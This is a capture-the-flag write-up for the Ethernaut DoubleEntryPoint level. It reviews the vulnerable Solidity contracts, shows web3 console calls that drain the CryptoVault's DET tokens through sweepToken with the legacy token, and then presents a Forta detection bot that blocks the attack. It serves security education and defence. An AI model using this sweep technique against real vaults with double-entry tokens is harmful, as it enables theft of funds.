<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel26.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }

  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  } 
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}
```

Challenge's message:

> This level features a CryptoVault with special functionality, the sweepToken function. This is a common function used to retrieve tokens stuck in a contract. The CryptoVault operates with an underlying token that can't be swept, as it is an important core logic component of the CryptoVault. Any other tokens can be swept.
The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT. In this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens.
The contract features a Forta contract where any user can register its own detection bot contract. Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a detection bot and register it in the Forta contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.


## Contracts Overview

1. **Forta**: The `Forta` contract acts as a notification system for detecting and handling potentially suspicious transactions. It allows users to associate detection bots with their accounts and receive alerts for detected activity.

2. **CryptoVault**: The `CryptoVault` contract represents a vault that can hold ERC20 tokens. It includes functions to set the underlying token and sweep any non-underlying tokens to a designated recipient.

3. **LegacyToken**: The `LegacyToken` contract is an ERC20 token contract that can be minted and includes the ability to delegate transfers to another contract.

4. **DoubleEntryPoint**: The `DoubleEntryPoint` contract is another ERC20 token contract that delegates transfers to a specified delegate and interacts with the `Forta` contract for transaction notifications.

## Contracts In Detail

### Forta

The `Forta` contract facilitates a transaction detection and alert system. It enables users to associate detection bots with their accounts and receive alerts for suspicious activities.

- `setDetectionBot(address detectionBotAddress)`: Users can set a detection bot for their account.

- `notify(address user, bytes calldata msgData)`: Notifies the associated detection bot about a user's transaction.

- `raiseAlert(address user)`: Allows the detection bot to raise alerts for suspicious activities.

### CryptoVault

The `CryptoVault` contract acts as a storage vault for ERC20 tokens.

- `setUnderlying(address latestToken)`: Sets the underlying token for the vault.

- `sweepToken(IERC20 token)`: Transfers any non-underlying tokens held by the vault to a specified recipient.

### LegacyToken

The `LegacyToken` contract represents an ERC20 token that can be minted and supports delegation of transfers.

- `mint(address to, uint256 amount)`: Allows the contract owner to mint new tokens.

- `delegateToNewContract(DelegateERC20 newContract)`: Delegates transfers to a specified contract.

- `transfer(address to, uint256 value)`: Overrides the standard ERC20 `transfer` function to either perform a direct transfer or delegate it based on the presence of a delegate contract.

### DoubleEntryPoint

The `DoubleEntryPoint` contract is an ERC20 token contract that delegates transfers to a delegate contract and interacts with the `Forta` contract for transaction notifications.

- `delegateTransfer(address to, uint256 value, address origSender)`: Delegates transfers to a delegate contract, ensuring that notifications are sent to the `Forta` contract.

- `fortaNotify()`: Notifies the `Forta` contract about the transaction and checks for raised alerts, reverting if alerts have been triggered.

## Interactions and Flow

1. A user deploys the `Forta` contract and associates it with their account. They can set a detection bot that will be notified about their transactions.

2. The user deploys the `CryptoVault` contract, specifying a recipient for swept tokens.

3. The user deploys the `LegacyToken` contract, allowing them to mint new tokens and delegate transfers to another contract.

4. The user deploys the `DoubleEntryPoint` contract, specifying the legacy token, `Forta` contract, crypto vault, and player addresses.

5. When a user initiates a transfer of `DoubleEntryPoint` tokens, the transfer is delegated to the delegate contract specified in the `LegacyToken`.

6. The delegate contract (`DoubleEntryPoint`) notifies the `Forta` contract about the transaction, passing along the transaction data.

7. The `Forta` contract's associated detection bot processes the transaction data and may raise an alert if suspicious activity is detected.

8. If an alert is raised, the `Forta` contract's `raiseAlert` function is called, incrementing the alert count for the specific detection bot.

9. The `DoubleEntryPoint` contract's `fortaNotify` modifier checks for raised alerts after the transaction is processed and reverts if an alert has been triggered.

## Summary

The provided smart contracts form a comprehensive system for detecting and handling potentially suspicious transactions. They showcase various aspects of token management, delegation, notification, and alerting within the Ethereum blockchain ecosystem. The contracts demonstrate the interaction between different components, enabling users to delegate transfers and receive notifications about transaction activity.

## Vulnerability

```js
vault = await contract.cryptoVault()
'0x1A82fBF3aF7542B550D2850b708E6F4D423E44fa'
```

```js
legacy = await contract.delegatedFrom()
'0x009e22b7A97A80f8Fa89CE23854D4EF134F510E6'
```

```js
await web3.eth.getStorageAt(vault, 1)
'0x000000000000000000000000ce7840ab1c857db85387f39bf8e4393cbc985db0'
```

```js
await web3.eth.call({from:player, to:legacy, data:'0xc89e4361'})
'0x000000000000000000000000ce7840ab1c857db85387f39bf8e4393cbc985db0'
```

## Subverting

```js
await contract.balanceOf(cryptoVaultAddr).then(b => b.toString());
'100000000000000000000'
```

```js
const _function = {
  "inputs": [
    { 
      "name": "token",
      "type": "address"
    }
  ],
  "name": "sweepToken", 
  "type": "function"
};
```

```js
const param = [legacy];
```

```js
const data = web3.eth.abi.encodeFunctionCall(_function, param);
```

```js
await web3.eth.sendTransaction({from: player,to: vault,data: data});
```

```js
await contract.balanceOf(vault).then(x => x.toString());
'0'
```

# Solution

```solidity
pragma solidity ^0.8.0;

import './DoubleEntryPoint.sol';

contract Bot is IDetectionBot{

    address vault;

    constructor(address _vault){
        vault = _vault;
    }

    function handleTransaction(address _user, bytes calldata data) external override{

         address sender;

         assembly {
            sender := calldataload(0xa8)
            
        }

        if(sender==vault){
            Forta(msg.sender).raiseAlert(_user);
        }
    }

}
```





Deploy the `Bot` contract. See the transaction [on etherscan](https://sepolia.etherscan.io/tx/0x4dfe2f8b82b885e3318958c3be9c0ac3bb86912038a11e9673da23f8158e6209).

```js
forta = await contract.forta()
'0x5b3ddf8095BD68ebf069bD900B210BB8038EC8dD'
```

```js
const _function = {
  "inputs": [
    { 
      "name": "detectionBotAddr",
      "type": "address"
    }
  ],
  "name": "setDetectionBot", 
  "type": "function"
};
```


```js
// Bot contract's address

bot = "0x53449d3dfa4542b3B1a9B204b9121c6cdb2d592b"
'0x53449d3dfa4542b3B1a9B204b9121c6cdb2d592b'
```


```js
const param = [bot]
```


```js
const data = web3.eth.abi.encodeFunctionCall(_function,param)
```

See the transaction [on etherscan](https://sepolia.etherscan.io/tx/0x79aaf0c160c96c2665173c1c0f58561644ad2817b36165d6a4a32a635a13fcf5).

```js
await web3.eth.sendTransaction({from: player, to:forta, data:data})
```

Ethernaut's message:

> Congratulations! This is the first experience you have with a [Forta bot](https://docs.forta.network/en/latest/). Forta comprises a decentralized network of independent node operators who scan all transactions and block-by-block state changes for outlier transactions and threats. When an issue is detected, node operators send alerts to subscribers of potential risks, which enables them to take action. The presented example is just for educational purpose since Forta bot is not modeled into smart contracts. In Forta, a bot is a code script to detect specific conditions or events, but when an alert is emitted it does not trigger automatic actions - at least not yet. In this level, the bot's alert effectively trigger a revert in the transaction, deviating from the intended Forta's bot design.
Detection bots heavily depends on contract's final implementations and some might be upgradeable and break bot's integrations, but to mitigate that you can even create a specific bot to look for contract upgrades and react to it. Learn how to do it [here](https://docs.forta.network/en/latest/quickstart/).
You have also passed through a recent security issue that has been uncovered during OpenZeppelin's latest [collaboration with Compound protocol](https://compound.finance/governance/proposals/76).
Having tokens that present a double entry point is a non-trivial pattern that might affect many protocols. This is because it is commonly assumed to have one contract per token. But it was not the case this time :) You can read the entire details of what happened [here](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/).


**_by wasny0ps_**
